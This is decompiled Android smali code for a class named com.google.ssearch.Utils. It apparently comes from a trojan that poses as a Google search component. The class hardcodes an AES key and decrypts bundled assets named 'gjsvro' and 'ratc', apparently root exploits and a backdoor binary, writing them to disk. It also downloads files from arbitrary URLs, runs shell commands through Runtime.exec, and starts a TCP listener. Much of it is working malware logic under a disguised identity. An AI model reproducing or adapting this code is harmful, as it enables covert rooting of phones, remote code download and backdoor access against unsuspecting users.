.class public Lcom/google/ssearch/Utils;
.super Ljava/lang/Object;
.source "Utils.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/ssearch/Utils$PhoneState;,
        Lcom/google/ssearch/Utils$PkgManager;,
        Lcom/google/ssearch/Utils$TCP;
    }
.end annotation


# static fields
.field private static defPassword:[B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 228
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/google/ssearch/Utils;->defPassword:[B

    .line 40
    return-void

    .line 228
    :array_0
    .array-data 1
        0x46t
        0x75t
        0x63t
        0x6bt
        0x5ft
        0x73t
        0x45t
        0x78t
        0x79t
        0x2dt
        0x61t
        0x4ct
        0x6ct
        0x21t
        0x50t
        0x77t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static checkPermission()Z
    .locals 2

    .prologue
    .line 89
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/gjsvr"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 90
    invoke-static {}, Lcom/google/ssearch/Utils;->tryStartPermission()Z

    move-result v0

    .line 92
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 11
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "src"    # Ljava/lang/String;
    .param p2, "dest"    # Ljava/lang/String;

    .prologue
    .line 132
    const/4 v7, 0x0

    .line 133
    .local v7, "myOutput":Ljava/io/OutputStream;
    const/4 v6, 0x0

    .line 136
    .local v6, "myInput":Ljava/io/InputStream;
    const/16 v9, 0x400

    :try_start_0
    new-array v1, v9, [B

    .line 138
    .local v1, "buffer":[B
    new-instance v8, Ljava/io/FileOutputStream;

    invoke-direct {v8, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 139
    .end local v7    # "myOutput":Ljava/io/OutputStream;
    .local v8, "myOutput":Ljava/io/OutputStream;
    :try_start_1
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v9

    invoke-virtual {v9, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v6

    .line 140
    const-string v9, "gjsvro"

    invoke-virtual {v9, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_0

    const-string v9, "ratc"

    invoke-virtual {v9, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 141
    :cond_0
    invoke-virtual {v6}, Ljava/io/InputStream;->available()I

    move-result v4

    .line 142
    .local v4, "len":I
    new-array v0, v4, [B

    .line 143
    .local v0, "buff":[B
    invoke-virtual {v6, v0}, Ljava/io/InputStream;->read([B)I

    .line 144
    invoke-static {v0}, Lcom/google/ssearch/Utils;->decrypt([B)[B

    move-result-object v2

    .line 145
    .local v2, "decryptBuff":[B
    invoke-virtual {v8, v2}, Ljava/io/OutputStream;->write([B)V

    .line 151
    .end local v0    # "buff":[B
    .end local v2    # "decryptBuff":[B
    .end local v4    # "len":I
    :goto_0
    invoke-virtual {v8}, Ljava/io/OutputStream;->flush()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_7
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 155
    if-eqz v6, :cond_1

    :try_start_2
    invoke-virtual {v6}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    .line 156
    :cond_1
    :goto_1
    if-eqz v8, :cond_8

    :try_start_3
    invoke-virtual {v8}, Ljava/io/OutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    move-object v7, v8

    .line 158
    .end local v1    # "buffer":[B
    .end local v8    # "myOutput":Ljava/io/OutputStream;
    .restart local v7    # "myOutput":Ljava/io/OutputStream;
    :cond_2
    :goto_2
    return-void

    .line 148
    .end local v7    # "myOutput":Ljava/io/OutputStream;
    .restart local v1    # "buffer":[B
    .local v5, "length":I
    .restart local v8    # "myOutput":Ljava/io/OutputStream;
    :cond_3
    const/4 v9, 0x0

    :try_start_4
    invoke-virtual {v8, v1, v9, v5}, Ljava/io/OutputStream;->write([BII)V

    .line 147
    .end local v5    # "length":I
    :cond_4
    invoke-virtual {v6, v1}, Ljava/io/InputStream;->read([B)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_7
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    move-result v5

    .restart local v5    # "length":I
    if-gtz v5, :cond_3

    goto :goto_0

    .line 152
    .end local v1    # "buffer":[B
    .end local v5    # "length":I
    .end local v8    # "myOutput":Ljava/io/OutputStream;
    .restart local v7    # "myOutput":Ljava/io/OutputStream;
    :catch_0
    move-exception v9

    move-object v3, v9

    .line 153
    .local v3, "e":Ljava/lang/Exception;
    :goto_3
    :try_start_5
    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 155
    if-eqz v6, :cond_5

    :try_start_6
    invoke-virtual {v6}, Ljava/io/InputStream;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    .line 156
    :cond_5
    :goto_4
    if-eqz v7, :cond_2

    :try_start_7
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    goto :goto_2

    :catch_1
    move-exception v9

    goto :goto_2

    .line 154
    .end local v3    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v9

    .line 155
    :goto_5
    if-eqz v6, :cond_6

    :try_start_8
    invoke-virtual {v6}, Ljava/io/InputStream;->close()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    .line 156
    :cond_6
    :goto_6
    if-eqz v7, :cond_7

    :try_start_9
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_5

    .line 157
    :cond_7
    :goto_7
    throw v9

    .line 156
    .end local v7    # "myOutput":Ljava/io/OutputStream;
    .restart local v1    # "buffer":[B
    .restart local v8    # "myOutput":Ljava/io/OutputStream;
    :catch_2
    move-exception v9

    move-object v7, v8

    .end local v8    # "myOutput":Ljava/io/OutputStream;
    .restart local v7    # "myOutput":Ljava/io/OutputStream;
    goto :goto_2

    .line 155
    .end local v1    # "buffer":[B
    .restart local v3    # "e":Ljava/lang/Exception;
    :catch_3
    move-exception v9

    goto :goto_4

    .end local v3    # "e":Ljava/lang/Exception;
    :catch_4
    move-exception v10

    goto :goto_6

    .line 156
    :catch_5
    move-exception v10

    goto :goto_7

    .line 155
    .end local v7    # "myOutput":Ljava/io/OutputStream;
    .restart local v1    # "buffer":[B
    .restart local v8    # "myOutput":Ljava/io/OutputStream;
    :catch_6
    move-exception v9

    goto :goto_1

    .line 154
    :catchall_1
    move-exception v9

    move-object v7, v8

    .end local v8    # "myOutput":Ljava/io/OutputStream;
    .restart local v7    # "myOutput":Ljava/io/OutputStream;
    goto :goto_5

    .line 152
    .end local v7    # "myOutput":Ljava/io/OutputStream;
    .restart local v8    # "myOutput":Ljava/io/OutputStream;
    :catch_7
    move-exception v9

    move-object v3, v9

    move-object v7, v8

    .end local v8    # "myOutput":Ljava/io/OutputStream;
    .restart local v7    # "myOutput":Ljava/io/OutputStream;
    goto :goto_3

    .end local v7    # "myOutput":Ljava/io/OutputStream;
    .restart local v8    # "myOutput":Ljava/io/OutputStream;
    :cond_8
    move-object v7, v8

    .end local v8    # "myOutput":Ljava/io/OutputStream;
    .restart local v7    # "myOutput":Ljava/io/OutputStream;
    goto :goto_2
.end method

.method public static createFile(Ljava/lang/String;)Ljava/io/File;
    .locals 3
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 58
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 59
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 61
    :try_start_0
    invoke-virtual {v1}, Ljava/io/File;->createNewFile()Z
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 67
    :cond_0
    :goto_0
    return-object v1

    .line 62
    :catch_0
    move-exception v0

    .line 63
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method public static decrypt([B)[B
    .locals 5
    .param p0, "encrypted"    # [B
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 233
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    sget-object v3, Lcom/google/ssearch/Utils;->defPassword:[B

    const-string v4, "AES"

    invoke-direct {v2, v3, v4}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 234
    .local v2, "skeySpec":Ljavax/crypto/spec/SecretKeySpec;
    const-string v3, "AES"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 235
    .local v0, "cipher":Ljavax/crypto/Cipher;
    const/4 v3, 0x2

    invoke-virtual {v0, v3, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 236
    invoke-virtual {v0, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    .line 237
    .local v1, "decrypted":[B
    return-object v1
.end method

.method public static downloadFile(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "url"    # Ljava/lang/String;

    .prologue
    .line 166
    if-eqz p1, :cond_0

    const-string v0, ""

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 p0, 0x0

    .line 224
    .end local p0    # "context":Landroid/content/Context;
    .end local p1    # "url":Ljava/lang/String;
    :goto_0
    return-object p0

    .line 168
    .restart local p0    # "context":Landroid/content/Context;
    .restart local p1    # "url":Ljava/lang/String;
    :cond_1
    const/4 v0, 0x0

    .line 170
    .local v0, "filePath":Ljava/net/URL;
    :try_start_0
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 172
    .end local v0    # "filePath":Ljava/net/URL;
    .local v1, "filePath":Ljava/net/URL;
    const/4 v0, 0x0

    .line 173
    .local v0, "hc":Ljava/net/HttpURLConnection;
    :try_start_1
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    .end local v0    # "hc":Ljava/net/HttpURLConnection;
    check-cast v0, Ljava/net/HttpURLConnection;

    .line 174
    .restart local v0    # "hc":Ljava/net/HttpURLConnection;
    const/16 v2, 0x7530

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 175
    const/16 v2, 0x7530

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 176
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 177
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 179
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 181
    .local v3, "is":Ljava/io/InputStream;
    new-instance v0, Ljava/io/File;

    .end local v0    # "hc":Ljava/net/HttpURLConnection;
    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 182
    .local v0, "file":Ljava/io/File;
    if-nez v0, :cond_2

    const/4 p0, 0x0

    goto :goto_0

    .line 184
    :cond_2
    invoke-virtual {v0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    .line 185
    .local v0, "fileName":Ljava/lang/String;
    const-string p1, "download"

    .end local p1    # "url":Ljava/lang/String;
    invoke-static {p0, p1}, Lcom/google/ssearch/Utils;->getPath(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 186
    .local v4, "path":Ljava/lang/String;
    new-instance p0, Ljava/io/File;

    .end local p0    # "context":Landroid/content/Context;
    invoke-direct {p0, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 187
    .local p0, "ff":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result p1

    if-nez p1, :cond_3

    invoke-virtual {p0}, Ljava/io/File;->mkdir()Z

    .line 189
    :cond_3
    const-string p1, "sdcard"

    invoke-virtual {v4, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_4

    .line 190
    invoke-virtual {p0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    .line 191
    .local p1, "files":[Ljava/io/File;
    if-eqz p1, :cond_4

    array-length p0, p1

    .end local p0    # "ff":Ljava/io/File;
    if-lez p0, :cond_4

    .line 192
    array-length v2, p1

    const/4 p0, 0x0

    move v5, p0

    :goto_1
    if-lt v5, v2, :cond_5

    .line 198
    .end local p1    # "files":[Ljava/io/File;
    :cond_4
    const/4 p0, 0x0

    .line 199
    .local p0, "fos":Ljava/io/FileOutputStream;
    new-instance v2, Ljava/io/FileOutputStream;

    new-instance p0, Ljava/lang/StringBuilder;

    .end local p0    # "fos":Ljava/io/FileOutputStream;
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-direct {v2, p0}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 201
    .local v2, "fos":Ljava/io/FileOutputStream;
    const/16 p0, 0x800

    new-array p0, p0, [B

    .line 202
    .local p0, "buffer":[B
    const/4 p1, 0x0

    .line 203
    .local p1, "byteread":I
    if-eqz v3, :cond_8

    if-eqz v2, :cond_8

    .line 205
    :goto_2
    invoke-virtual {v3, p0}, Ljava/io/InputStream;->read([B)I

    move-result p1

    const/4 v5, -0x1

    if-ne p1, v5, :cond_7

    .line 208
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->flush()V

    .line 209
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 210
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 212
    const/4 p0, 0x2

    new-array p1, p0, [Ljava/lang/String;

    .line 213
    .end local p0    # "buffer":[B
    .local p1, "info":[Ljava/lang/String;
    const/4 p0, 0x0

    new-instance v2, Ljava/lang/StringBuilder;

    .end local v2    # "fos":Ljava/io/FileOutputStream;
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .end local v3    # "is":Ljava/io/InputStream;
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, p1, p0

    .line 214
    const/4 p0, 0x1

    aput-object v0, p1, p0

    .line 215
    new-instance p0, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    .end local v0    # "fileName":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 216
    .local p0, "downloadFile":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result p0

    .end local p0    # "downloadFile":Ljava/io/File;
    if-eqz p0, :cond_8

    move-object p0, p1

    .line 217
    goto/16 :goto_0

    .line 192
    .restart local v0    # "fileName":Ljava/lang/String;
    .restart local v3    # "is":Ljava/io/InputStream;
    .local p1, "files":[Ljava/io/File;
    :cond_5
    aget-object p0, p1, v5

    .line 193
    .local p0, "f":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_6

    invoke-virtual {p0}, Ljava/io/File;->delete()Z

    .line 192
    :cond_6
    add-int/lit8 p0, v5, 0x1

    move v5, p0

    goto :goto_1

    .line 206
    .restart local v2    # "fos":Ljava/io/FileOutputStream;
    .local p0, "buffer":[B
    .local p1, "byteread":I
    :cond_7
    const/4 v5, 0x0

    invoke-virtual {v2, p0, v5, p1}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 220
    .end local v0    # "fileName":Ljava/lang/String;
    .end local v2    # "fos":Ljava/io/FileOutputStream;
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "path":Ljava/lang/String;
    .end local p0    # "buffer":[B
    .end local p1    # "byteread":I
    :catch_0
    move-exception p0

    move-object p1, v1

    .line 221
    .end local v1    # "filePath":Ljava/net/URL;
    .local p0, "e":Ljava/lang/Exception;
    .local p1, "filePath":Ljava/net/URL;
    :goto_3
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    move-object p0, p1

    .line 224
    .end local p1    # "filePath":Ljava/net/URL;
    .local p0, "filePath":Ljava/net/URL;
    :goto_4
    const/4 p0, 0x0

    goto/16 :goto_0

    .line 220
    .local v0, "filePath":Ljava/net/URL;
    .local p0, "context":Landroid/content/Context;
    .local p1, "url":Ljava/lang/String;
    :catch_1
    move-exception p0

    move-object p1, v0

    .end local v0    # "filePath":Ljava/net/URL;
    .local p1, "filePath":Ljava/net/URL;
    goto :goto_3

    .end local p0    # "context":Landroid/content/Context;
    .end local p1    # "filePath":Ljava/net/URL;
    .restart local v1    # "filePath":Ljava/net/URL;
    .restart local v4    # "path":Ljava/lang/String;
    :cond_8
    move-object p0, v1

    .end local v1    # "filePath":Ljava/net/URL;
    .local p0, "filePath":Ljava/net/URL;
    goto :goto_4
.end method

.method public static getPath(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "file"    # Ljava/lang/String;

    .prologue
    .line 44
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    .line 45
    .local v0, "path":Ljava/lang/String;
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v1

    .line 46
    const-string v2, "mounted"

    .line 45
    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 47
    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    .line 49
    :cond_0
    if-eqz p1, :cond_1

    .line 50
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 53
    :cond_1
    return-object v0
.end method

.method public static isConnected(Landroid/content/Context;)Z
    .locals 5
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    .line 74
    const-string v2, "connectivity"

    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 77
    .local v0, "cmd":Landroid/net/ConnectivityManager;
    invoke-virtual {v0, v3}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 78
    .local v1, "info":Landroid/net/NetworkInfo;
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    move v2, v3

    .line 83
    :goto_0
    return v2

    .line 80
    :cond_0
    invoke-virtual {v0, v4}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 81
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_1

    move v2, v3

    goto :goto_0

    :cond_1
    move v2, v4

    .line 83
    goto :goto_0
.end method

.method public static oldrun(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p0, "cmd"    # Ljava/lang/String;
    .param p1, "param"    # Ljava/lang/String;

    .prologue
    .line 121
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    .line 122
    .local v2, "rt":Ljava/lang/Runtime;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {p0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 123
    .local v1, "fullCmd":Ljava/lang/String;
    invoke-virtual {v2, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 127
    .end local v1    # "fullCmd":Ljava/lang/String;
    .end local v2    # "rt":Ljava/lang/Runtime;
    :goto_0
    return-void

    .line 124
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 125
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static runsh(Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p0, "cmd"    # Ljava/lang/String;
    .param p1, "param"    # Ljava/lang/String;

    .prologue
    .line 106
    :try_start_0
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/google/ssearch/Utils$1;

    invoke-direct {v2, p0, p1}, Lcom/google/ssearch/Utils$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 111
    .local v1, "thread":Ljava/lang/Thread;
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 116
    .end local v1    # "thread":Ljava/lang/Thread;
    :goto_0
    return-void

    .line 112
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 113
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static tryStartPermission()Z
    .locals 1

    .prologue
    .line 97
    invoke-static {}, Lcom/google/ssearch/Utils$TCP;->isListened()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    .line 99
    :goto_0
    return v0

    .line 98
    :cond_0
    invoke-static {}, Lcom/google/ssearch/Utils$TCP;->startListen()V

    .line 99
    invoke-static {}, Lcom/google/ssearch/Utils$TCP;->isListened()Z

    move-result v0

    goto :goto_0
.end method
